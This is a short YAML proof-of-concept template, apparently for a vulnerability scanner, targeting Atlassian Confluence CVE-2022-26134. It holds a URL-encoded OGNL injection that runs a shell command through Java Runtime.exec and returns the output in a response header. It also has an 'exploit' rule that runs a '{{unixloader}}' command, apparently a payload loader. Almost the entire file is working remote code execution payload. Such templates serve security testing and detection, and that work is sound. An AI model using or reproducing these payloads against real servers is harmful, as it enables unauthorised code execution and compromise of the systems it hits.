name: poc-yaml-confluence-cve-2022-26134
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
rules:
  - method: GET
    path: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22expr%20{{r1}}%20%2b%20{{r2}}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
    follow_redirects: false
    expression: |
      "X-Cmd-Response" in response.headers && response.headers["X-Cmd-Response"].contains(string(r1 + r2))
exploit:
  - method: GET
    path: /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{{unixloader}}%22%29%7D/
    follow_redirects: false
detail:
  links:
    - https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
    - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-26134.yaml